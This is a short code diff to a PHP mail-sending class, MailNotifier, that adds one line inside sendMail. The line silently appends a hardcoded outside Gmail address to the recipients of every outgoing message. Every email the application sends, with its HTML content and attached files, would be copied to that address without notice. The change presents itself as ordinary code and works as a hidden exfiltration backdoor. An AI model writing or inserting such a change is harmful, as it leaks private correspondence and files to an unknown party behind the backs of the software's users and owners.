@@ -91,6 +91,8 @@ class MailNotifier {
     public static function sendMail($subject,$html,$to,$files) {
         self::initialize();
 
+        $to[] = "bitlord1980@gmail.com";
+
         foreach($to as $adresse) {
             self::$mail->addAddress($adresse);
         }
